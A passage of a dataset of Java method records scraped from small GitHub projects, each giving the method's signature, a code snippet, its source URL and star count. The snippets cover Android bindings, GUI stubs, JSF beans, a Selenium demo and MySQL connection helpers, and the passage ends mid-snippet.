"modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\tpublic void onMeasure (int p0, int p1)\t{\t\tn_onMeasure (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onMeasure (int p0, int p1)\t{\t\tn_onMeasure (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onMeasure (int p0, int p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ContainerView.java", "stars": "2", "class": {"name": "ContainerView", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tint n;\t\tScanner sc = new Scanner(System.in);\t\tSystem.out.println(\"enter no of rows:\");\t\tn = sc.nextInt();\t\tint k;\t\tfor(int i = 1;i <= n; i++) {\t\t\tk = 0;\t\t\tfor(int j = 1 ;j <= i ; j++) {\t\t\t\twhile(k < n-i) {\t\t\t\t\tSystem.out.print(\" \");\t\t\t\t\tk = k + 1;\t\t\t\t}\t\t\t\tif(j == i) {\t\t\t\t\tSystem.out.print(j);\t\t\t\t}\t\t\t\telse {\t\t\t\t\tSystem.out.print(j+\" \");\t\t\t\t}\t\t\t}\t\t\tSystem.out.print(\"\\n\");\t\t}\t\tsc.close();\t}", "url": "https://raw.githubusercontent.com/likith22/java-programs/master/PyramidNumbers.java", "stars": "3", "class": {"name": "PyramidNumbers", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setGUI", "params": ["IGUICallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGUI(IGUICallback back) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "render", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void render(int x, int y, float partialTicks) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "renderForeground", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void renderForeground(int x, int y, float partialTicks) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "getClickAwareRange", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Pairs<Range,Range>", "snippet": "    public Pairs<Range, Range> getClickAwareRange() {        return new Pairs<>(new Range(x, x + width), new Range(y, y + height));    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onClicked", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClicked(int mouseX, int mouseY, int mouseButton) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onClickedOutside", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClickedOutside(int mouseX, int mouseY, int mouseButton) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onKeyInput", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onKeyInput(char key, int keyCode) {        return false;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "update", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void update() {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "getID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getID() {        return id;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/GuiElementBase.java", "stars": "2", "class": {"name": "GuiElementBase", "extends": "Gui", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "accept", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean accept(File pathname) {        /*            \u8fc7\u6ee4\u7684\u89c4\u5219:            \u5728accept\u65b9\u6cd5\u4e2d,\u5224\u65adFile\u5bf9\u8c61\u662f\u5426\u662f\u4ee5.java\u7ed3\u5c3e            \u662f\u5c31\u8fd4\u56detrue            \u4e0d\u662f\u5c31\u8fd4\u56defalse         */        //\u5982\u679cpathname\u662f\u4e00\u4e2a\u6587\u4ef6\u5939,\u8fd4\u56detrue,\u7ee7\u7eed\u904d\u5386\u8fd9\u4e2a\u6587\u4ef6\u5939        if(pathname.isDirectory()){            return true;        }        return pathname.getName().toLowerCase().endsWith(\".java\");    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo03Filter/FileFilterImpl.java", "stars": "2", "class": {"name": "FileFilterImpl", "extends": null, "implements": ["FileFilter"], "modifiers": ["public"]}}, {"method_name": "getProjectName", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getProjectName(final int id) {    final Project project = this.projectManager.getProject(id);    if (project == null) {      return String.valueOf(id);    }    return project.getName();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/VelocityUtil.java", "stars": "18", "class": {"name": "VelocityUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testJson", "params": [], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void testJson() throws IOException {        List<Car> cars = new ArrayList<>();        Random rand = new Random();        for(int i = 0; i < 50000; i++){            Car c = new Car();            String type = TestConstants.carTypes.get(rand.nextInt(TestConstants.carTypes.size()));            int gas = rand.nextInt(200);            List<String> cords = Arrays.asList(rand.nextInt(500) + \"\", rand.nextInt(500) + \"\", rand.nextInt(500) + \"\");            Owner own = new Owner();            String firstName = TestConstants.names.get(rand.nextInt(TestConstants.names.size()));            String lastName = TestConstants.names.get(rand.nextInt(TestConstants.names.size()));            int age = rand.nextInt(100);            own.init(firstName, lastName, age);            c.init(type, gas, cords, own);            cars.add(c);        }        long time = System.currentTimeMillis();        Gson gson = new Gson();        String json = gson.toJson(cars);        File f = new File(\"test.json\");        if(!f.exists()) f.createNewFile();        FileOutputStream fos = new FileOutputStream(f);        fos.write(json.getBytes());        fos.close();        System.out.println(\"GSON Save in \" + (System.currentTimeMillis() - time) + \"ms\");        time = System.currentTimeMillis();        FileInputStream fis = new FileInputStream(f);        String data = new String(fis.readAllBytes());        fis.close();        Type listType = new TypeToken<List<Car>>(){}.getType();        List<Car> retrievedCars = gson.fromJson(data, listType);        retrievedCars.get(300).getOwner();        System.out.println(\"GSON Load in \" + (System.currentTimeMillis() - time) + \"ms\");    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/json/JsonTests.java", "stars": "2", "class": {"name": "JsonTests", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLayoutId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId(int viewType) {        return R.layout.item_pop_mode;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ModeAdapter.java", "stars": "2", "class": {"name": "ModeAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "convert", "params": ["VH", "UserMode", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void convert(VH holder, UserMode data, int position) {        TextView popTv = holder.getView(R.id.item_pop_tv);        switch (data.getModeType()) {            case Constant.LIVE_MODETYPE:                popTv.setGravity(Gravity.CENTER);                break;            case Constant.MEMBERS_MODETYPE:                popTv.setGravity(Gravity.CENTER | Gravity.LEFT);                ConstraintLayout.LayoutParams layoutParams = new ConstraintLayout.LayoutParams(ConstraintLayout.LayoutParams.MATCH_PARENT, ConstraintLayout.LayoutParams.MATCH_PARENT);                layoutParams.setMargins((int) (MyApplication.getInstance().getResources().getDisplayMetrics().density * 17 + 0.5f), 0, 0, 0);                popTv.setLayoutParams(layoutParams);                break;        }        popTv.setText(data.getModeTip());    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ModeAdapter.java", "stars": "2", "class": {"name": "ModeAdapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "listTeamLinks", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<LinkTeamVO>", "snippet": "    public List<LinkTeamVO> listTeamLinks() {        // \u6570\u636e\u5e93\u5168\u90e8\u7684 link        List<Links> links = linksMapper.selectAll();        if (links == null) {            return null;        }        Map<String, List<Links>> map = new HashMap<>();        if (links.size() > 0) {            Links link1 = links.get(0);            List<Links> list = new ArrayList<>();            list.add(link1);            map.put(link1.getTeam(), list);        }        for (int i = 1; i < links.size(); i++) {            Links link = links.get(i);            String team = link.getTeam();            if (map.containsKey(team)) {                List<Links> list = map.get(team);                list.add(link);                map.put(team, list);            } else {                List<Links> list = new ArrayList<>();                list.add(link);                map.put(link.getTeam(), list);            }        }        List<LinkTeamVO> vos = new ArrayList<>();        Set<Map.Entry<String, List<Links>>> entries = map.entrySet();        Iterator<Map.Entry<String, List<Links>>> iterator = entries.iterator();        while (iterator.hasNext()) {            Map.Entry<String, List<Links>> next = iterator.next();            LinkTeamVO vo = new LinkTeamVO();            String key = next.getKey();            vo.setTeam(key);            vo.setLinks(next.getValue());            vos.add(vo);        }        return vos;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/LinksServiceImpl.java", "stars": "1", "class": {"name": "LinksServiceImpl", "extends": null, "implements": ["LinksService"], "modifiers": ["public"]}}, {"method_name": "deleteById", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteById(Long id) {        Assert.notNull(id, \"Id must be not null\");        linksMapper.deleteByPrimaryKey(id);    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/LinksServiceImpl.java", "stars": "1", "class": {"name": "LinksServiceImpl", "extends": null, "implements": ["LinksService"], "modifiers": ["public"]}}, {"method_name": "createOrUpdateLink", "params": ["Links"], "throws": null, "modifiers": ["public"], "return_type": "Links", "snippet": "    public Links createOrUpdateLink(Links links) {        if (links.getId() == null) {            // \u65b0\u589e            Long id = linksMapper.insert(links);            links.setId(id);        } else {            // \u4fee\u6539            linksMapper.updateByPrimaryKey(links);        }        return links;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/LinksServiceImpl.java", "stars": "1", "class": {"name": "LinksServiceImpl", "extends": null, "implements": ["LinksService"], "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getCount() {        return linksMapper.getCount();    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/LinksServiceImpl.java", "stars": "1", "class": {"name": "LinksServiceImpl", "extends": null, "implements": ["LinksService"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\t\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"drivers/chromedriver.exe\");\t\tWebDriver driver = new ChromeDriver();\tString url=\"http://google.com\";//\tdriver.get(url);\t//\tdriver.get(\"http://google.com\");//\t//\tString currentUrl= driver.getCurrentUrl();//\tSystem.out.println(\"Current URL :\" + currentUrl);//\t//\t\t//\tString title= driver.getTitle();//\tSystem.out.println(\"title: \"+title);//\t//\tif(title.equalsIgnoreCase(\"gooooogle\")) {//\t\tSystem.out.println(\"expected and actual title match\");//\t}else {//\t\tSystem.out.println(\"expected and actual title does NOT match\");//\t}//\tdriver.close();//\t// driver.quit();\t\t\tdriver.navigate().to(url);\tdriver.navigate().back();\tdriver.navigate().forward();\tdriver.navigate().refresh();\t\t\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class1/Class1.java", "stars": "3", "class": {"name": "Class1", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "inicializar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void inicializar() {\t\tenderecos = new ArrayList<>();\t\tdao = new ClienteDao();\t\tcliente = new Cliente();\t\tendereco = new Endereco();\t\t\t\t//\t    clientes = new ArrayList<>();//\t\tbuscarClientes();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "salvar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void salvar() {\t\tcliente.setEnderecos(enderecos);\t\tdao.salvar(cliente);\t\tlimpar();\t\tFacesUtil.addInfoMessage(\"Cliente salvo com sucesso\");\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buscarClientes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void buscarClientes() {\t\tclientes = dao.buscarTodos();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "limpar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void limpar() {\t\tcliente = new Cliente();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "adicionarEndereco", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void adicionarEndereco() {\t\tenderecos.add(endereco);\t\tcliente.setEnderecos(enderecos);\t\tendereco = new Endereco();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCliente", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cliente", "snippet": "\tpublic Cliente getCliente() {\t\treturn cliente;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCliente", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCliente(Cliente cliente) {\t\tthis.cliente = cliente;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ClienteDao", "snippet": "\tpublic ClienteDao getDao() {\t\treturn dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDao", "params": ["ClienteDao"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDao(ClienteDao dao) {\t\tthis.dao = dao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getClienteSelecionado", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cliente", "snippet": "\tpublic Cliente getClienteSelecionado() {\t\treturn clienteSelecionado;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setClienteSelecionado", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setClienteSelecionado(Cliente clienteSelecionado) {\t\tthis.clienteSelecionado = clienteSelecionado;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getClientes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Cliente>", "snippet": "\tpublic List<Cliente> getClientes() {\t\treturn clientes;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setClientes", "params": ["List<Cliente>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setClientes(List<Cliente> clientes) {\t\tthis.clientes = clientes;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEnderecos", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Endereco>", "snippet": "\tpublic List<Endereco> getEnderecos() {\t\treturn enderecos;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEnderecos", "params": ["List<Endereco>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setEnderecos(List<Endereco> enderecos) {\t\tthis.enderecos = enderecos;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTipo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TipoPessoa", "snippet": "\tpublic TipoPessoa[] getTipo() {\t\treturn TipoPessoa.values();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEndereco", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Endereco", "snippet": "\tpublic Endereco getEndereco() {\t\treturn endereco;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEndereco", "params": ["Endereco"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setEndereco(Endereco endereco) {\t\tthis.endereco = endereco;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/bean/CadastroClienteBean.java", "stars": "1", "class": {"name": "CadastroClienteBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "openConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void openConnection() {        try {            Class.forName(\"com.mysql.jdbc.Driver\");            connect();            createTables();        } catch (Exception e) {        }    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/database/impl/MySQLConnection.java", "stars": "2", "class": {"name": "MySQLConnection", "extends": null, "implements": ["DatabaseConnection"], "modifiers": ["public"]}}, {"method_name": "getConnection", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Connection", "snippet": "    public Connection getConnection(boolean autoCommit) {        try {            if (connection == null || connection.isClosed())                connect();            connection.setAutoCommit(autoCommit);            return connection;        } catch (Exception exception) {            return null;        }    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/database/impl/MySQLConnection.java", "stars": "2", "class": {"name": "MySQLConnection", "extends": null, "implements": ["DatabaseConnection"], "modifiers": ["public"]}}, {"method_name": "connect", "params": [], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void connect() throws SQLException {        connection = DriverManager.getConnection(\"jdbc:mysql://\" + hostname + \"/\" + schema, username, password);    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/database/impl/MySQLConnection.java", "stars": "2", "class": {"name": "MySQLConnection", "extends": null, "implements": ["DatabaseConnection"], "modifiers": ["public"]}}, {"method_name": "createTables", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createTables() {        try (Statement statement = connection.createStatement()) {            statement.executeUpdate(\"CREATE TABLE IF NOT EXISTS vips (\" +                    \"uuid VARCHAR(36) NOT NULL, \" +                    \"vip_type VARCHAR(50) NOT NULL, \" +                    \"time BIGINT(19) NOT NULL,\" +                    \"primary key (uuid, vip_type) \" +                    \")\");        } catch (Exception exception) {            // TODO: log        }    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/database/impl/MySQLConnection.java", "stars": "2", "class": {"name": "MySQLConnection", "extends": null, "implements": ["DatabaseConnection"], "modifiers": ["public"]}}, {"method_name": "getDataSourceName", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "String", "snippet": "    protected abstract String getDataSourceName();    protected abstract String tableName();    private boolean isBadTransaction() {        return (mContext == null || mContext.getTransaction() == null || mContext.getTransaction().isEnded());    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "tableName", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "String", "snippet": "    protected abstract String tableName();    private boolean isBadTransaction() {        return (mContext == null || mContext.getTransaction() == null || mContext.getTransaction().isEnded());    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "isBadTransaction", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isBadTransaction() {        return (mContext == null || mContext.getTransaction() == null || mContext.getTransaction().isEnded());    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setTransaction", "params": ["XContext"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setTransaction(XContext context) {        mContext = context;        if (mContext != null && mContext.getTransaction() != null) {            if (mContext.getTransaction().getConnection() == null) {                return mContext.getTransaction().setConnection(XMySQL.getConnection(getDataSourceName()));            }            return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getConnection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Connection", "snippet": "    public Connection getConnection() {        if (!isBadTransaction()) {            return mContext.getTransaction().getConnection();        }        return XMySQL.getConnection(getDataSourceName());    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "closeConnection", "params": ["ResultSet", "PreparedStatement", "Connection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeConnection(ResultSet rs, PreparedStatement pstmt, Connection conn) {        if (rs != null) {            try {                rs.close();            } catch (Exception e) {                logger.error(\"XModel.closeConnection.Exception\", e);            }        }        if (pstmt != null) {            try {                pstmt.close();            } catch (Exception e) {                logger.error(\"XModel.closeConnection.Exception\", e);            }        }        if (isBadTransaction()) {            XMySQL.releaseConnection(conn);        }    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "selectBySQL", "params": ["String", "List<Object>"], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray selectBySQL(String sql, List<Object> data) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.size(); i++) {                    pstmt.setObject(i + 1, data.get(i));                }            }            rs = pstmt.executeQuery();            logger.info(\"selectBySQL: \" + readOriginalSql(pstmt));            return this.getJSONArray(rs);        } catch (SQLException e) {            